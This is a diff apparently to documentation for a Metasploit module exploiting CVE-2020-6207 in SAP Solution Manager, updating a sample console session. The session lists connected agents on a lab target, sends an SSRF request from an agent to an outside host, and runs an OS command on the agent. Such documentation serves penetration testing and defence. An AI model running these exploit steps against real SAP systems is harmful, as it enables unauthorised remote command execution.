@@ -90,45 +90,55 @@ msf6 > workspace -a SAP_TEST
 [*] Added workspace: SAP_TEST
 [*] Workspace: SAP_TEST
 msf6 > use auxiliary/admin/sap/cve_2020_6207_solman_rce
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set RHOST 172.16.30.46
-RHOST => 172.16.30.46
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION LIST
 ACTION => LIST
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set RHOST 172.16.30.46
+RHOST => 172.16.30.46
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Running module against 172.16.30.46
 
 [*] Getting a list of agents connected to the Solution Manager: 172.16.30.46
-[+] Connected agents list:
-+--------------+------------------------+---------------+------------------------+--------------+
-| Server Name  | Host Name              | Instance Name | OS Name                | Java Version |
-+--------------+------------------------+---------------+------------------------+--------------+
-| test_linux   | SAPERP.corp.test.com   | SMDA98        | Linux                  | 1.8.0_25     |
-| test_windows | SAP731.corp.test.com   | SMDA97        | Windows Server 2008 R2 | 1.6.0_29     |
-+--------------+------------------------+---------------+------------------------+--------------+
+[+] Successfully retrieved agent list:
+Connected Agents List
+=====================
+
+ Server Name   Host Name                Instance Name  OS Name                 Java Version
+ -----------   ---------                -------------  -------                 ------------
+ test_windows  SAP731.corp.test.com     SMDA97         Windows Server 2008 R2  1.6.0_29
+ test_linux    SAPERP7.corp.test.com    SMDA98         Linux                   1.8.0_25
+
 [*] Auxiliary module execution completed
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SSRF
+ACTION => SSRF
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
 AGENT => test_linux
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_METHOD PUT
 SSRF_METHOD => PUT
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_URI http://192.168.50.2:9999/
-SSRF_URI => http://192.168.50.2:9999/
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SSRF
-ACTION => SSRF
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_URI http://192.168.50.3:7777/
+SSRF_URI => http://192.168.50.3:7777/
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Running module against 172.16.30.46
 
-[+] Send SSRF: 'PUT http://192.168.50.2:9999/ HTTP/1.1' from agent: test_linux
+[*] Enable EEM on agent: test_linux
+[*] Start script: 36al0keSSTeh with SSRF payload on agent: test_linux
+[*] Stop script: 36al0keSSTeh on agent: test_linux
+[*] Delete script: 36al0keSSTeh on agent: test_linux
+[+] Send SSRF: 'PUT http://192.168.50.3:7777/ HTTP/1.1' from agent: test_linux
 [*] Auxiliary module execution completed
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION EXEC
+ACTION => EXEC
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
 AGENT => test_linux
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set COMMAND ping -c 4 192.168.50.2
-COMMAND => ping -c 4 192.168.50.2
-msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set action EXEC
-action => EXEC
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set COMMAND ping -c 4 192.168.50.3
+COMMAND => ping -c 4 192.168.50.3
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
 [*] Running module against 172.16.30.46
 
-[+] Execution command: 'ping -c 4 192.168.50.2' on agent: test_linux
+[*] Enable EEM on agent: test_linux
+[*] Start script: qAPSRKSCysFf with RCE payload on agent: test_linux
+[*] Stop script: qAPSRKSCysFf on agent: test_linux
+[*] Delete script: qAPSRKSCysFf on agent: test_linux
+[+] Execution command: 'ping -c 4 192.168.50.3' on agent: test_linux
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > services
 Services
@@ -145,7 +155,10 @@ Vulnerabilities
 
 Timestamp                Host          Name                                                            References
 ---------                ----          ----                                                            ----------
-2021-03-21 10:31:36 UTC  172.16.30.46  SAP Solution Manager remote unauthorized OS commands execution  CVE-2020-6207,URL-https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf,URL-https://github.com/chipik/SAP_EEM_CVE-2020-6207
+2021-03-25 14:01:33 UTC  172.16.30.46  SAP Solution Manager remote unauthorized OS commands execution  CVE-2020-6207,URL-https://i.blackhat.com/USA-20/Wednesday/us-20-
+                                                                                                       Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-E
+                                                                                                       nterprise-Software-Servers-wp.pdf,URL-https://github.com/chipik/
+                                                                                                       SAP_EEM_CVE-2020-6207
 
 ```
 
